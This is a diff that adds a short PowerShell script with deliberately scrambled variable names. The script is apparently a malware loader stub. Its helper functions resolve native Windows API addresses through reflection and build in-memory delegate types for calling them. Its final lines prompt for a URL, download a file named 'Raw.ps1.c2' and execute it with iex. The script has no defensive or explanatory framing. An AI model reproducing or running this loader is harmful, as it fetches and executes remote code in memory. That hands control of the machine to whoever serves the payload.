@@ -1,0 +1,18 @@
+﻿function Get-FunctionBaseAddress {
+    Param ($NcaxeafGoOHRcNxIEgHTFMzaglTQbR, $VuStIJxuSMGAkLrKXMoDDOIpwPKssJRfWXx)
+    $PLTearoDIZTAUQAzeUGGpKysHDGh = ([AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $jPeJzJsXrzhJfVnDdnwTkIFDye = $PLTearoDIZTAUQAzeUGGpKysHDGh.GetMethods() | ? { $_.Name -eq "GetProcAddress" }
+    $hdCzpwbaREYdXGMKwOBplvVLdRbvoiiLeTUIAxVaF = $jPeJzJsXrzhJfVnDdnwTkIFDye[0].Invoke($null, ($PLTearoDIZTAUQAzeUGGpKysHDGh.GetMethod('GetModuleHandle').Invoke($null,@($NcaxeafGoOHRcNxIEgHTFMzaglTQbR)), $VuStIJxuSMGAkLrKXMoDDOIpwPKssJRfWXx))
+    return $hdCzpwbaREYdXGMKwOBplvVLdRbvoiiLeTUIAxVaF
+}
+function Get-DelegateType {
+    Param ([Type[]] $RWcBuwdccNtSUYMyOWboZYjCOHzYSMHEAKU, [Type] $xsOBckBWhViwObCpAeXPvsaepGt = [Void] )
+    $HzlXCETeBmKBSEhKlgouTIz = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+    $HzlXCETeBmKBSEhKlgouTIz.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $RWcBuwdccNtSUYMyOWboZYjCOHzYSMHEAKU).SetImplementationFlags('Runtime, Managed')
+    $HzlXCETeBmKBSEhKlgouTIz.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $xsOBckBWhViwObCpAeXPvsaepGt, $RWcBuwdccNtSUYMyOWboZYjCOHzYSMHEAKU).SetImplementationFlags('Runtime, Managed')
+    return $HzlXCETeBmKBSEhKlgouTIz.CreateType()
+}
+[string]::IsNullOrEmpty($prefixpath) -and ($prefixpath = Read-Host "Specify prefixpathUrl")
+$wbc = New-Object System.Net.WebClient
+$wbc.Encoding = [System.Text.Encoding]::UTF8
+$wbc.DownloadString("$prefixpath/Raw.ps1.c2") | iex
